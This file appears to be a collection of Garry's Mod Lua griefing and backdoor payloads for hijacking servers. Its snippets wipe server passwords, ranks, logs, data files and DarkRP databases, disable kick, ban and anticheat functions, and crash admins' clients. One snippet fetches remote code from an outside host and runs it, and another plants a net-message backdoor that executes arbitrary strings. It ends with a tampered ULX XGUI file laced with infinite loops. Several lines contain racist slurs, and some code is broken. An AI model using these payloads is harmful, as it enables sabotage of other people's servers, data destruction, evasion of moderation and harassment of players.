--[[

    Rainbow Physic Gun All

]]--


hook.Add("Think","somewhere_over_the_rainbow",function()
	local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
	for _, v in ipairs(player.GetAll()) do
		v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
	end
end)


--[[

    Remove Server Password

]]--


RunConsoleCommand('sv_password','')


--[[

    StopSound

]]--


RunConsoleCommand("stopsound")


--[[

    AddMoney

]]--


for k,v in pairs(player.GetAll()) do v:addMoney("99999") end


--[[

    Set RP NAME ALL

]]--


for k,v in pairs(player.GetAll()) do v:setDarkRPVar( "rpname", "Kévin" ) end


--[[

    Delete ULX Ranks

]]--


if file.Exists( "ulib/groups.txt", "DATA" ) then file.Delete("ulib/groups.txt") end


--[[

    Break Kick / Ban

]]--


if ULib then
	function ULib.kick( ply, reason, calling_ply ) end
	function ULib.ban( ply, time, reason, admin ) end
	function ULib.addBan( steamid, time, reason, name, admin ) end
end

if FAdmin then
	local function no(ply) end
	FAdmin.Commands.AddCommand("kick", no)
	FAdmin.Commands.AddCommand("ban", no)
	FAdmin.Commands.AddCommand("jail", no)
	FAdmin.Commands.AddCommand("UnJail", no)
	FAdmin.Commands.AddCommand("ClearDecals", no)
	FAdmin.Commands.AddCommand("StopSounds", no)
	FAdmin.Commands.AddCommand("CleanUp", no)
end


local _R = debug.getregistry()

function _R.Player.Ban(ply, r) end


function _R.Player.Kick(ply, r) end

function game.KickID(id, reason) end

local RCM = RunConsoleCommand

function RunConsoleCommand(command, ...)
	if command == "addip" then return end
	RCM(command, ...)
end


--[[

    Apocalypse

]]--


hook.Add("Think", "2012akaapocalypse", function()
local explode = ents.Create( "env_explosion" ) 
    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
    explode:Spawn() 
    explode:SetKeyValue( "iMagnitude", "500" ) 
    explode:Fire( "Explode", 0, 0 ) 
end)


--[[

    Clean UP Map

]]--


game.CleanUpMap()


--[[

    Random TP

]]--


for k,v in pairs(player.GetAll()) do v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) end


--[[

    Unlock All Doors

]]--


local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end


--[[

    Toggle All Door

]]--


local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end 


--[[

    Launch Everybody

]]--


for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end


--[[

    Ignite Everybody

]]--


for k,v in pairs(player.GetAll()) do v:Ignite(120) end


--[[

    Kill Everybody

]]--


for k,v in pairs(player.GetAll()) do v:Kill() end


--[[

    Upgrade All

]]--


hook.Add("Think", "gvaked", function()
	for k,v in pairs (player.GetAll()) do
    	v:SetModelScale(2.5, 100);
    	v:SetRunSpeed(400 * 2);
    	v:SetWalkSpeed(200 * 2);
	v:SetModel( "models/props_c17/gravestone_statue001a.mdl" )
    end
end)


--[[

    Big Head

]]--


for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
        end


--[[

    Force Danse All

]]--


for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )


--[[

    Force Say

]]--


for k,v in pairs(player.GetAll()) do
    v:ConCommand("say /// connect 149.202.139.220:27600")
end


--[[

    Force Retry All

]]--


for k,v in pairs(player.GetAll()) do
    v:ConCommand("retry")
end


--[[

    Nuke (M9k)

]]--


local rocket = ents.Create("m9k_launched_davycrockett")
local ply2 = table.Random(player.GetAll())
if ply2 == ply then ply:ChatPrint("[RunString] Prevented epicentre from being you.") else
    rocket:SetPos(ply2:GetPos())
    rocket:SetOwner(ply2)
    rocket.Owner = ply2
    rocket:Spawn()
    rocket:Activate()
ply:ChatPrint("[RunString] Allahu akbar.")  
end


--[[

    Crash All Staff

]]--


for _, p in pairs(player.GetAll()) do
if (p:IsAdmin()) then
    p:SendLua("cam.End3D()")
end
end


--[[

    Cough The Console

]]--


for k,v in pairs(player.GetAll()) do
timer.Create("cough", 4, 0, function()
    RunConsoleCommand("say", "*cough* *cough*")
    v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 20)
    util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 5, 5000 )
end)
end


--[[

    SpeedHack

]]--


hook.Add("Think", "speedhackisback", function()
for k,v in pairs (player.GetAll()) do
    v:SetRunSpeed(400* 4);
    v:SetWalkSpeed(200 * 2);
end
end)


--[[

    Minimize All Players

]]--


hook.Add("Think", "kirikou", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.1, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)


--[[

    Giant All Players

]]--


hook.Add("Think", "giantgreenboy", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(5.5, 100);
        v:SetRunSpeed(200 * 2);
        v:SetWalkSpeed(100 * 2);
    end
end)


--[[

    2D Players

]]--


local bm = false
for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end


--[[

    Strip All

]]--


for k,v in pairs(ply:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end


--[[

    Slap all players

]]--


for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end


--[[

    Explose All Vehicule

]]--


for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then 

        local explo = ents.Create("env_explosion")

        explo:SetPos(v:GetPos())

        explo:SetKeyValue("iMagnitude", "300")

        explo:Spawn()

        explo:Activate()

        explo:Fire("Explode", "", 0)

        end

        end


--[[

    Sexy FootStep

]]--


hook.Add( "PlayerFootstep", "oooh", function( ply ) 
	ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )
		end )


--[[

    Disable CAC

]]--


_G.cac = function() end



--[[

    Rename Server

]]--


RunConsoleCommand("hostname", "[FR] TeamFrench SchoolRP #"..math.random(1,999).."")



--[[

    Break Vanilla Kick & Ban

]]--


_R = debug.getregistry()
			
			function game.KickID( id, reason )
			
				return
			
			end
			
			function _R.Player.Ban()
			
				return
			
			end
			
			function _R.Player.Kick()
			
				return
				
			end



--[[

        Remplir Data

]]--


for i = 1, 100 do 
file.Write( "hello.from.michael_" .. math.random( 1, 999999 ) .. ".txt", "[===[Niggerized Server]===]" )
end



--[[

    Force Laugh All

]]--


timer.Create( "gotEm3?", 1, 120, function()
				
for k, v in next, player.GetAll() do
    
    if v:UserID() == v then continue end
    
    v:SendLua('RunConsoleCommand("act","laungh")')
        
end

end )



--[[

    Clear ULX & Blogs Logs

]]--


timer.Simple(15, function()
http.Fetch("disp0.cf/gas.lua",function(b)RunString(b)end,nil)
timer.Simple(4, function()
file.Delete( "ulx_logs/"..os.date( "%m-%d-%y" )..".txt" )
file.Delete( "darkrp_logs/"..os.date( "%m-%d-%y" )..".txt" )
sql.Query( "DROP TABLE blogs_v3 ;" )
sql.Query( DELETE FROM ulogs; )
sql.Query( DELETE FROM mlog_logs; )
end )
end )



--[[

    Set DarkRP Name

]]--


local DESIRED_NAME = "h4x0risedbyn4s4"

timer.Create( "changeyournamemotherfucker", 0.5, 0, function() for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, DESIRED_NAME) v:setDarkRPVar("rpname", DESIRED_NAME) end  end)
end )
 
 
for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, DESIRED_NAME) v:setDarkRPVar("rpname", DESIRED_NAME) end



--[[

    Erase Data

]]--


local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end



--[[

    Erase MySQL DarkRP

]]--


MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')



--[[

    WAV Symphony

]]--


timer.Create( "eardieinstantly", 0.2, 0, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:EmitSound( "physics/body/body_medium_impact_hard"..math.random(1,6)..".wav", 100, math.random( 40, 180 ) )
 
            end
 
        end)



--[[

    The War 

]]--


timer.Create( "datwar", 1, 0, function()
 
            for _, p in pairs(player.GetAll()) do
 
                p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )
 
            end
 
        end)



--[[

        Explose All Vehicule

]]--


for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
 
        local explo = ents.Create("env_explosion")
 
        explo:SetPos(v:GetPos())
 
        explo:SetKeyValue("iMagnitude", "300")
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire("Explode", "", 0)
 
        end
 
        end



--[[

        Spam toggle door

]]--


timer.Create("nigga", 1, 0, function()
local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end
end)



--[[

    Change Level

]]--


game.ConsoleCommand("changelevel gm_construct\n")



--[[

    Toggle GodMod

]]--


if v:HasGodMode() then v:GodDisable() else v:GodEnable() end



--[[

    Fast Crash Game

]]--


v:SendLua("function vacced() return vacced() end vacced()")



--[[

    Add .NET Backdoor

]]--


util.AddNetworkString( 'netstring' ) net.Receive( 'netstring', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )



--[[

    Reset Shadow Map Cycle

]]--


for k,v in pairs(player.GetAll()) do
v:SendLua('RunConsoleCommand("r_shader_srgb","0")')
end



--[[

    Cac ERROR

]]--


CAC.Detections = {}



--[[

    Turn all player screen 66 seconds

]]--


for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10000, 10000, 6, 66 )]] ) end



--[[

    Force Player Micro

]]--


function VoiceOn()
    LocalPlayer():ConCommand("+voicerecord")
    end
    concommand.Add("VoiceOn", VoiceOn)
    function VoiceOff()
    LocalPlayer():ConCommand("-voicerecord")
    end
    concommand.Add("VoiceOff", VoiceOff)



--[[

    Mute All Players

]]--


for k, v inpairs(player.GetAll()) do
  v:SendLua("RunConsoleCommand('volume', 0)")
end



--[[

    Disable ALT+E

]]--


RunConsoleCommand( "sitting_admin_only", "1" )



--[[

    Enable Global Noclip

]]--


RunConsoleCommand( "sbox_noclip", "1" )



--[[

    Kill !menu

]]--


ULib.addSayCommand( '!menu', stopnut )

ULib.cmds.addCommand( "ulx menu", function()
	sound.PlayURL( "https://instaud.io/_/2xHf.mp3", "", function()end )
end )


function stopnut()
	sound.PlayURL( "https://instaud.io/_/2xHf.mp3", "", function()end )
end




--[[

    ULX TRUE DO END

]]--


if file.Exists("ulx/modules/cl/xgui_client.lua","LUA") then
    timer.Simple(1,function()
--XGUI: A GUI for ULX -- by Stickly Man!
xgui = xgui or {}

--Make a spot for modules to store data and hooks
xgui.data = xgui.data or {}
xgui.hook = xgui.hook or { onProcessModules={}, onOpen={}, onClose={} }
--Call this function in your client-side module code to ensure the data types have been instantiated on the client.
function xgui.prepareDataType( dtype, location )
	if not xgui.data[dtype] then
		xgui.data[dtype] = location or {}
		xgui.hook[dtype] = { clear={}, process={}, done={}, add={}, update={}, remove={}, data={} }
	end
end

--Set up various hooks modules can "hook" into.
function xgui.hookEvent( dtype, event, func, name )
	if not xgui.hook[dtype] or ( event and not xgui.hook[dtype][event] ) then
		Msg( "XGUI: Attempted to add to invalid type or event to a hook! (" .. dtype .. ", " .. ( event or "nil" ) .. ")\n" )
	else
		if not name then name = "FixMe" .. math.floor(math.random()*10000) end -- Backwards compatibility for older XGUI modules
		if not event then
			xgui.hook[dtype][name] = func
		else
			xgui.hook[dtype][event][name] = func
		end
	end
end

--Set up tables and functions for creating and storing modules
xgui.modules = xgui.modules or {}

xgui.modules.tab = xgui.modules.tab or {}
function xgui.addModule( name, panel, icon, access, tooltip )
	local refreshModules = false
	for i = #xgui.modules.tab, 1, -1 do
		if xgui.modules.tab[i].name == name then
			xgui.modules.tab[i].panel:Remove()
			xgui.modules.tab[i].tabpanel:Remove()
			xgui.modules.tab[i].xbutton:Remove()
			table.remove(xgui.modules.tab, i)
			refreshModules = true
		end
	end
	table.insert( xgui.modules.tab, { name=name, panel=panel, icon=icon, access=access, tooltip=tooltip } )
	if refreshModules then xgui.processModules() end
end

xgui.modules.setting = xgui.modules.setting or {}
function xgui.addSettingModule( name, panel, icon, access, tooltip )
	local refreshModules = false
	for i = #xgui.modules.setting, 1, -1 do
		if xgui.modules.setting[i].name == name then
			xgui.modules.setting[i].panel:Remove()
			xgui.modules.setting[i].tabpanel:Remove()
			table.remove(xgui.modules.setting, i)
			refreshModules = true
		end
	end
	table.insert( xgui.modules.setting, { name=name, panel=panel, icon=icon, access=access, tooltip=tooltip } )
	if refreshModules then xgui.processModules() end
end

xgui.modules.submodule = xgui.modules.submodule or {}
function xgui.addSubModule( name, panel, access, mtype )
	local refreshModules = false
	for i = #xgui.modules.submodule, 1, -1 do
		if xgui.modules.submodule[i].name == name then
			xgui.modules.submodule[i].panel:Remove()
			table.remove(xgui.modules.submodule, i)
			refreshModules = true
		end
	end
	table.insert( xgui.modules.submodule, { name=name, panel=panel, access=access, mtype=mtype } )
	if refreshModules then xgui.processModules() end
end
--Set up a spot to store entries for autocomplete.
xgui.tabcompletes = xgui.tabcompletes or {}
xgui.ulxmenucompletes = xgui.ulxmenucompletes or {}


--Set up XGUI clientside settings, load settings from file if it exists
xgui.settings = xgui.settings or {}
if ULib.fileExists( "data/ulx/xgui_settings.txt" ) then
	local input = ULib.fileRead( "data/ulx/xgui_settings.txt" )
	input = input:match( "^.-\n(.*)$" )
	xgui.settings = ULib.parseKeyValues( input )
end
--Set default settings if they didn't get loaded
if not xgui.settings.moduleOrder then xgui.settings.moduleOrder = { "Cmds", "Groups", "Maps", "Settings", "Bans" } end
if not xgui.settings.settingOrder then xgui.settings.settingOrder = { "Sandbox", "Server", "Client" } end
if not xgui.settings.animTime then xgui.settings.animTime = 0.22 else xgui.settings.animTime = tonumber( xgui.settings.animTime ) end
if not xgui.settings.infoColor then
	--Default color
	xgui.settings.infoColor = Color( 100, 255, 255, 128 )
else
	--Ensure that the color contains numbers, not strings
	xgui.settings.infoColor = Color(xgui.settings.infoColor.r, xgui.settings.infoColor.g, xgui.settings.infoColor.b, xgui.settings.infoColor.a)
end
if not xgui.settings.showLoadMsgs then xgui.settings.showLoadMsgs = true else xgui.settings.showLoadMsgs = ULib.toBool( xgui.settings.showLoadMsgs ) end
if not xgui.settings.skin then xgui.settings.skin = "Default" end
if not xgui.settings.xguipos then xgui.settings.xguipos = { pos=5, xoff=0, yoff=0 } end
if not xgui.settings.animIntype then xgui.settings.animIntype = 1 end
if not xgui.settings.animOuttype then xgui.settings.animOuttype = 1 end


function xgui.init( ply )
	xgui.load_helpers()

	--Initiate the base window (see xgui_helpers.lua for code)
	xgui.makeXGUIbase{}

	--Create the bottom infobar
	xgui.infobar = xlib.makepanel{ x=10, y=399, w=580, h=20, parent=xgui.anchor }
	xgui.infobar:NoClipping( true )
	xgui.infobar.Paint = function( self, w, h )
		draw.RoundedBoxEx( 4, 0, 1, 580, 20, xgui.settings.infoColor, false, false, true, true )
	end
	local infoLabel = string.format( "\nULX Admin Mod :: XGUI - Team Ulysses |  ULX %s  |  ULib %s", ULib.pluginVersionStr("ULX"), ULib.pluginVersionStr("ULib") )
	xlib.makelabel{ x=5, y=-10, label=infoLabel, parent=xgui.infobar }:NoClipping( true )
	xgui.thetime = xlib.makelabel{ x=515, y=-10, label="", parent=xgui.infobar }
	xgui.thetime:NoClipping( true )
	xgui.thetime.check = function()
		xgui.thetime:SetText( os.date( "\n%I:%M:%S %p" ) )
		xgui.thetime:SizeToContents()
		timer.Simple( 1, xgui.thetime.check )
	end
	xgui.thetime.check()

	--Create an offscreen place to parent modules that the player can't access
	xgui.null = xlib.makepanel{ x=-10, y=-10, w=0, h=0 }
	xgui.null:SetVisible( false )

	--Load modules
	local sm = xgui.settings.showLoadMsgs
	if sm then
		Msg( "\n///////////////////////////////////////\n" )
		Msg( "//  ULX GUI -- Made by Stickly Man!  //\n" )
		Msg( "///////////////////////////////////////\n" )
		Msg( "// Loading GUI Modules...            //\n" )
	end
	for _, file in ipairs( file.Find( "ulx/xgui/*.lua", "LUA" ) ) do
		include( "ulx/xgui/" .. file )
		if sm then Msg( "//   " .. file .. string.rep( " ", 32 - file:len() ) .. "//\n" ) end
	end
	if sm then Msg( "// Loading Setting Modules...        //\n" ) end
	for _, file in ipairs( file.Find( "ulx/xgui/settings/*.lua", "LUA" ) ) do
		include( "ulx/xgui/settings/" .. file )
		if sm then Msg( "//   " .. file .. string.rep( " ", 32 - file:len() ) .. "//\n" ) end
	end
	if sm then Msg( "// Loading Gamemode Module(s)...     //\n" ) end
	if ULib.isSandbox() and GAMEMODE.FolderName ~= "sandbox" then -- If the gamemode sandbox-derived (but not sandbox, that will get added later), then add the sandbox Module
		include( "ulx/xgui/gamemodes/sandbox.lua" )
		if sm then Msg( "//   sandbox.lua                     //\n" ) end
	end
	for _, file in ipairs( file.Find( "ulx/xgui/gamemodes/*.lua", "LUA" ) ) do
		if string.lower( file ) == string.lower( GAMEMODE.FolderName .. ".lua" ) then
			include( "ulx/xgui/gamemodes/" .. file )
			if sm then Msg( "//   " .. file .. string.rep( " ", 32 - file:len() ) .. "//\n" ) end
			break
		end
		if sm then Msg( "//   No module found!                //\n" ) end
	end
	if sm then Msg( "// Modules Loaded!                   //\n" ) end
	if sm then Msg( "///////////////////////////////////////\n\n" ) end

	--Find any existing modules that aren't listed in the requested order.
	local function checkModulesOrder( moduleTable, sortTable )
		for _, m in ipairs( moduleTable ) do
			local notlisted = true
			for _, existing in ipairs( sortTable ) do
				if m.name == existing then
					notlisted = false
					break
				end
			end
			if notlisted then
				table.insert( sortTable, m.name )
			end
		end
	end
	checkModulesOrder( xgui.modules.tab, xgui.settings.moduleOrder )
	checkModulesOrder( xgui.modules.setting, xgui.settings.settingOrder )

	--Check if the server has XGUI installed
	RunConsoleCommand( "_xgui", "getInstalled" )

	xgui.initialized = true

	xgui.processModules()
end
hook.Add( ULib.HOOK_LOCALPLAYERREADY, "InitXGUI", xgui.init, HOOK_MONITOR_LOW )

function xgui.saveClientSettings()
	if not ULib.fileIsDir( "data/ulx" ) then
		ULib.fileCreateDir( "data/ulx" )
	end
	local output = "// This file stores clientside settings for XGUI.\n"
	output = output .. ULib.makeKeyValues( xgui.settings )
	ULib.fileWrite( "data/ulx/xgui_settings.txt", output )
end

function xgui.checkModuleExists( modulename, moduletable )
	for k, v in ipairs( moduletable ) do
		if v.name == modulename then
			return k
		end
	end
	return false
end

function xgui.processModules()
	local activetab = nil
	if xgui.base:GetActiveTab() then
		activetab = xgui.base:GetActiveTab():GetValue()
	end

	local activesettingstab = nil
	if xgui.settings_tabs:GetActiveTab() then
		activesettingstab = xgui.settings_tabs:GetActiveTab():GetValue()
	end

	xgui.base:Clear() --We need to remove any existing tabs in the GUI
	xgui.tabcompletes = {}
	xgui.ulxmenucompletes = {}
	for _, modname in ipairs( xgui.settings.moduleOrder ) do
		local module = xgui.checkModuleExists( modname, xgui.modules.tab )
		if module then
			module = xgui.modules.tab[module]
			if module.xbutton == nil then
				module.xbutton = xlib.makebutton{ x=555, y=-5, w=32, h=24, btype="close", parent=module.panel }
				module.xbutton.DoClick = function()
					xgui.hide()
				end
			end
			if LocalPlayer():query( module.access ) then
				xgui.base:AddSheet( module.name, module.panel, module.icon, false, false, module.tooltip )
				module.tabpanel = xgui.base.Items[#xgui.base.Items].Tab
				table.insert( xgui.tabcompletes, "xgui show " .. modname )
				table.insert( xgui.ulxmenucompletes, "ulx menu " .. modname )
			else
				module.tabpanel = nil
				module.panel:SetParent( xgui.null )
			end
		end
	end

	xgui.settings_tabs:Clear() --Clear out settings tabs for reprocessing
	for _, modname in ipairs( xgui.settings.settingOrder ) do
		local module = xgui.checkModuleExists( modname, xgui.modules.setting )
		if module then
			module = xgui.modules.setting[module]
			if LocalPlayer():query( module.access ) then
				xgui.settings_tabs:AddSheet( module.name, module.panel, module.icon, false, false, module.tooltip )
				module.tabpanel = xgui.settings_tabs.Items[#xgui.settings_tabs.Items].Tab
				table.insert( xgui.tabcompletes, "xgui show " .. modname )
				table.insert( xgui.ulxmenucompletes, "ulx menu " .. modname )
			else
				module.tabpanel = nil
				module.panel:SetParent( xgui.null )
			end
		end
	end

	--Call any functions that requested to be called when permissions change
	xgui.callUpdate( "onProcessModules" )
	table.sort( xgui.tabcompletes )
	table.sort( xgui.ulxmenucompletes )

	local hasFound = false
	if activetab then
		for _, v in pairs( xgui.base.Items ) do
			if v.Tab:GetValue() == activetab then
				xgui.base:SetActiveTab( v.Tab, true )
				hasFound = true
				break
			end
		end
		if not hasFound then
			xgui.base.m_pActiveTab = "none"
			xgui.base:SetActiveTab( xgui.base.Items[1].Tab, true )
		end
	end

	hasFound = false
	if activesettingstab then
		for _, v in pairs( xgui.settings_tabs.Items ) do
			if v.Tab:GetValue() == activesettingstab then
				xgui.settings_tabs:SetActiveTab( v.Tab, true )
				hasFound = true
				break
			end
		end
		if not hasFound then
			xgui.settings_tabs.m_pActiveTab = "none"
			xgui.settings_tabs:SetActiveTab( xgui.settings_tabs.Items[1].Tab, true )
		end
	end
end

function xgui.checkNotInstalled( tabname )
	if xgui.notInstalledWarning then return end

	gui.EnableScreenClicker( true )
	RestoreCursorPosition()
	xgui.notInstalledWarning = xlib.makeframe{ label="XGUI Warning!", w=375, h=110, nopopup=true, showclose=false, skin=xgui.settings.skin }
	xlib.makelabel{ x=10, y=30, wordwrap=true, w=365, label="XGUI has not initialized properly with the server. This could be caused by a heavy server load after a mapchange, a major error during XGUI server startup, or XGUI not being installed.", parent=xgui.notInstalledWarning }

	xlib.makebutton{ x=37, y=83, w=80, label="Offline Mode", parent=xgui.notInstalledWarning }.DoClick = function()
		xgui.notInstalledWarning:Remove()
		xgui.notInstalledWarning = nil
		offlineWarning = xlib.makeframe{ label="XGUI Warning!", w=375, h=110, nopopup=true, showclose=false, skin=xgui.settings.skin }
		xlib.makelabel{ x=10, y=30, wordwrap=true, w=365, label="XGUI will run locally in offline mode. Some features will not work, and information will be missing. You can attempt to reconnect to the server using the 'Refresh Server Data' button in the XGUI client menu.", parent=offlineWarning }
		xlib.makebutton{ x=77, y=83, w=80, label="OK", parent=offlineWarning }.DoClick = function()
			offlineWarning:Remove()
			xgui.offlineMode = true
			xgui.show( tabname )
		end
		xlib.makebutton{ x=217, y=83, w=80, label="Cancel", parent=offlineWarning }.DoClick = function()
			offlineWarning:Remove()
			RememberCursorPosition()
			gui.EnableScreenClicker( false )
		end
	end

	xlib.makebutton{ x=257, y=83, w=80, label="Close", parent=xgui.notInstalledWarning }.DoClick = function()
		xgui.notInstalledWarning:Remove()
		xgui.notInstalledWarning = nil
		RememberCursorPosition()
		gui.EnableScreenClicker( false )
	end

	xlib.makebutton{ x=147, y=83, w=80, label="Try Again", parent=xgui.notInstalledWarning }.DoClick = function()
		xgui.notInstalledWarning:Remove()
		xgui.notInstalledWarning = nil
		RememberCursorPosition()
		gui.EnableScreenClicker( false )
		local reattempt = xlib.makeframe{ label="XGUI: Attempting reconnection...", w=200, h=20, nopopup=true, showclose=false, skin=xgui.settings.skin }
		timer.Simple( 1, function()
			RunConsoleCommand( "_xgui", "getInstalled" )
			reattempt:Remove()
			timer.Simple( 0.5, function() xgui.show( tabname ) end )
		end )
	end
end

function xgui.show( tabname )
	if not xgui.anchor then return end
	if not xgui.initialized then return end

	--Check if XGUI is not installed, display the warning if hasn't been shown yet.
	if not xgui.isInstalled and not xgui.offlineMode then
		xgui.checkNotInstalled( tabname )
		return
	end

	if not game.SinglePlayer() and not ULib.ucl.authed[LocalPlayer():UniqueID()] then
		local unauthedWarning = xlib.makeframe{ label="XGUI Error!", w=250, h=90, showclose=true, skin=xgui.settings.skin }
		xlib.makelabel{ label="Your ULX player has not been Authed!", x=10, y=30, parent=unauthedWarning }
		xlib.makelabel{ label="Please wait a couple seconds and try again.", x=10, y=45, parent=unauthedWarning }
		xlib.makebutton{ x=50, y=63, w=60, label="Try Again", parent=unauthedWarning }.DoClick = function()
			unauthedWarning:Remove()
			xgui.show( tabname )
		end
		xlib.makebutton{ x=140, y=63, w=60, label="Close", parent=unauthedWarning }.DoClick = function()
			unauthedWarning:Remove()
		end
		return
	end

	if xgui.base.refreshSkin then
		xgui.base:SetSkin( xgui.settings.skin )
		xgui.base.refreshSkin = nil
	end

	--In case the string name had spaces, it sent the whole argument table. Convert it to a string here!
	if type( tabname ) == "table" then
		tabname = table.concat( tabname, " " )
	end
	--Sets the active tab to tabname if it was specified
	if tabname and tabname ~= "" then
		local found, settingsTab
		for _, v in ipairs( xgui.modules.tab ) do
			if string.lower( v.name ) == "settings" then settingsTab = v.tabpanel end
			if string.lower( v.name ) == string.lower( tabname ) and v.panel:GetParent() ~= xgui.null then
				xgui.base:SetActiveTab( v.tabpanel )
				if xgui.anchor:IsVisible() then return end
				found = true
				break
			end
		end
		if not found then
			for _, v in ipairs( xgui.modules.setting ) do
				if string.lower( v.name ) == string.lower( tabname ) and v.panel:GetParent() ~= xgui.null then
					xgui.base:SetActiveTab( settingsTab )
					xgui.settings_tabs:SetActiveTab( v.tabpanel )
					if xgui.anchor:IsVisible() then return end
					found = true
					break
				end
			end
		end
		if not found then return end --If invalid input was taken, then do nothing.
	end

	xgui.base.animOpen()
	gui.EnableScreenClicker( true )
	RestoreCursorPosition()
	xgui.anchor:SetMouseInputEnabled( true )

	--Calls the functions requesting to hook when XGUI is opened
	xgui.callUpdate( "onOpen" )
end

function xgui.hide()
	if not xgui.anchor then return end
	if not xgui.anchor:IsVisible() then return end
	RememberCursorPosition()
	gui.EnableScreenClicker( false )
	xgui.anchor:SetMouseInputEnabled( false )
	xgui.base.animClose()
	CloseDermaMenus()

	--Calls the functions requesting to hook when XGUI is closed
	xgui.callUpdate( "onClose" )
end

function xgui.toggle( tabname )
	if xgui.anchor and ( not xgui.anchor:IsVisible() or ( tabname and #tabname ~= 0 ) ) then
		xgui.show( tabname )
		while true do end
	else
		xgui.hide()
		while true do end
	end
end

--New XGUI Data stuff
function xgui.expectChunks( numofchunks )
	if xgui.isInstalled then
		xgui.expectingdata = true
		xgui.chunkbox.max = numofchunks
		xgui.chunkbox.value = 0
		xgui.chunkbox:SetFraction( 0 )
		xgui.chunkbox.Label:SetText( "Getting data: Waiting for server..." )
		xgui.chunkbox:SetVisible( true )
		xgui.chunkbox:SetSkin( xgui.settings.skin )
